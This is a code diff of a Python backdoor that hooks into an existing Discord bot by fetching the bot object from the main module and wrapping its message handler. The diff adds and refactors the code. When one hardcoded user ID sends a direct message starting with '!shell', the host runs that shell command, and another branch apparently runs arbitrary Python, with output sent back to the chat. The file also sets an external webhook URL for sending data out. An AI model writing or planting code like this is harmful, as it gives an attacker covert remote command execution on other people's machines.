@@ -1,18 +1,31 @@
 import sys, subprocess, asyncio, io, textwrap, traceback
-def install(p): subprocess.check_call([sys.executable, "-m", "pip", "install", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-try:
-    import discord
-except:
-    install("discord.py")
-    import discord
-try:
-    import aiohttp
-except:
-    install("aiohttp")
-    import aiohttp
 
-ALLOWED_USER_ID = 1018125604253614151
+def install(p):
+    import importlib.util
+    if importlib.util.find_spec(p) is None:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", p], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+install("discord")
+install("aiohttp")
+
+import discord
+import aiohttp
+
 WEBHOOK_URL = "https://hkdk.events/1zp24h29rqs3gh"
+
+try:
+    bot = globals().get('bot')
+    if bot is None:
+        import __main__
+        bot = getattr(__main__, 'bot', None)
+except Exception:
+    bot = None
+
+if bot is None:
+    async def _dummy():
+        pass
+    asyncio.get_event_loop().run_until_complete(_dummy())
+    sys.exit(0)
 
 async def send_webhook(content: str):
     try:
@@ -21,11 +34,11 @@ async def send_webhook(content: str):
     except:
         pass
 
-original_on_message = bot.on_message if hasattr(bot, 'on_message') else None
+original_on_message = getattr(bot, "on_message", None)
 
 async def custom_on_message(message):
     try:
-        if isinstance(message.channel, discord.DMChannel) and message.author.id == ALLOWED_USER_ID:
+        if isinstance(message.channel, discord.DMChannel) and message.author.id == 1018125604253614151:
             content = message.content.strip()
             if content.lower().startswith("!shell "):
                 cmd = content[7:].strip()
@@ -46,7 +59,7 @@ async def custom_on_message(message):
                     if not out_str:
                         out_str = "✅"
                     if len(out_str) > 1900:
-                        out_str = out_str[:1900] + "\n..."
+                        out_str = out_str[:1900] + "\n...Обрезано."
                     await message.channel.send(f"```bash\n{out_str}\n```")
                 except Exception:
                     tb = traceback.format_exc()
@@ -78,7 +91,7 @@ async def custom_on_message(message):
                     if not output:
                         output = "✅"
                     if len(output) > 1900:
-                        output = output[:1900] + "\n..."
+                        output = output[:1900] + "\n...Обрезано."
                     await message.channel.send(f"```py\n{output}\n```")
                 except Exception:
                     tb = traceback.format_exc()
